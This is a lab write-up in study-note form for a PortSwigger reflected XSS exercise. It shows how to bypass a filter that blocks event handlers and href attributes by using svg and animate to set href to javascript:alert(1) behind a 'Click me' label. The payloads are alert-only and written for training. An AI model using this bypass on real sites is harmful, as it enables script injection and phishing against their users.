---
title: LAB 0.13
aliases:
  - LAB 0.13
tags:
  - XSS
  - Labs
  - Reflected
  - Expert
description: "Lab: Reflected XSS with event handlers and href attributes blocked"
---

# Lab: Reflected XSS with event handlers and `href` attributes blocked
---
[LAB](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the `alert` function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

`<a href="">Click me</a>`

---

## Step 1: Identifying Valid Tags

The first step is to identify which HTML tags are allowed. Using an Burp Suite or manual testing as we have done in [[LAB 0.11#Step 2 Identify Allowed Tags]], you can find a list of valid tags. In this lab, these tags were allowed:

- `<a>`
- `<animate>`
- `<image>`
- `<svg>`
- `<title>`

---

## Step 2: Crafting a Payload

We need to exploit the allowed tags to execute a JavaScript alert. Through experimentation, the following payloads were successful:

### Basic Payloads

1. `<a id="x">Click Me</a>`
2. `<a id="x" tabindex="0">Click Me</a>`

### Using `<svg>` and `<animate>`

Combining `<svg>` and `<animate>`, we crafted this payload:

```html
<svg>
  <rect width="7" height="7" fill="green">
    <animate attributeType="application/javascript" attributeName="alert(1)" from="1" to="0" dur="4s" repeatCount="indefinite" />
  </rect>
</svg>
```

![[images/Pasted image 20250126165118.png]] 

While valid, this method required refinement to make it more practical for phishing users.

---

## Step 3: Combining Tags for a Clickable XSS Vector

To craft a better attack vector:

1. Chain `<svg>`, `<a>`, and `<animate>` together.
2. Use `attributeName="href"` and set its value to `javascript:alert(1)`.
3. Add a `<text>` element for user interaction.

The refined payload:

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

This payload uses the `href` attribute of `<a>` for the JavaScript alert and a clickable label to trick the user.

---

## Step 4: Testing the Payload

Paste the encoded payload into the lab’s search parameter and trigger it by interacting with the "Click me" link. The alert should execute successfully, solving the lab.

![[images/Pasted image 20250126165309.png]]

---
#### Congratulations!

You’ve successfully exploited the vulnerability and solved the lab!
